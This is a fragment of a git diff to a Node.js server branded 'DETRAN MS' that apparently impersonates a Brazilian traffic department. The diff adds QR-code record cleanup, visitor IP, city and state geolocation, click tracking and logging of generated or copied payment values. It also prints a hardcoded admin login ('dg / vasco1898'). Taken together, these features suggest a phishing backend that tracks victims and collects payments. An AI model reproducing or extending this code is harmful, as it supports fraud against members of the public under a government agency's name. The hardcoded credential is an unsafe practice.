                 console.log(`🧹 Limpou ${cliques.length - cliquesAtualizados.length} cliques antigos (> ${diasParaManter} dias)`);
             }
+            
+            // Limpa QR Codes antigos
+            const qrcodes = await readData('qrcodes.json');
+            const qrcodesAtualizados = qrcodes.filter(q => {
+                const dataQRCode = new Date(q.dataHora);
+                return dataQRCode >= limiteData;
+            });
+            
+            if (qrcodesAtualizados.length < qrcodes.length) {
+                await writeData('qrcodes.json', qrcodesAtualizados);
+                console.log(`🧹 Limpou ${qrcodes.length - qrcodesAtualizados.length} QR Codes antigos (> ${diasParaManter} dias)`);
+            }
         }
     } catch (error) {
         console.error('Erro na limpeza automática:', error);
@@ -1154,9 +1440,10 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'OK', 
         service: 'DETRAN MS',
-        version: '2.6.0',
+        version: '2.6.1',
         timestamp: new Date().toISOString(),
-        online: usuariosOnline.size
+        online: usuariosOnline.size,
+        geolocalizacao: 'Ativa'
     });
 });
 
@@ -1195,17 +1482,18 @@ const PORT = process.env.PORT || 3000;
 
 const server = app.listen(PORT, () => {
     console.log('============================================');
-    console.log('✅ Servidor DETRAN MS v2.6.0 rodando na porta: ' + PORT);
+    console.log('✅ Servidor DETRAN MS v2.6.1 rodando na porta: ' + PORT);
     console.log('🌐 Acesse: http://localhost:' + PORT);
     console.log('👨‍💼 Painel Admin: /painel.html');
     console.log('📊 Dados salvos em: /data/');
-    console.log('🖱️ Novo: Sistema de cliques ativado');
-    console.log('📍 IP completo + estado detectado');
+    console.log('📍 GEOLOCALIZAÇÃO ATIVA: IP + CIDADE + ESTADO');
+    console.log('🖱️ Sistema de cliques funcionando');
+    console.log('📱 QR Codes sendo registrados');
     console.log('💰 Valores gerados/copiados separados');
     console.log('🔐 Usuário admin: dg / vasco1898');
-    console.log('📱 Sistema PRONTO para uso!');
+    console.log('🚀 TODAS CORREÇÕES APLICADAS!');
     console.log('============================================');
 });
 
-// Export para Render (opcional)
+// Export para Render
 module.exports = app;
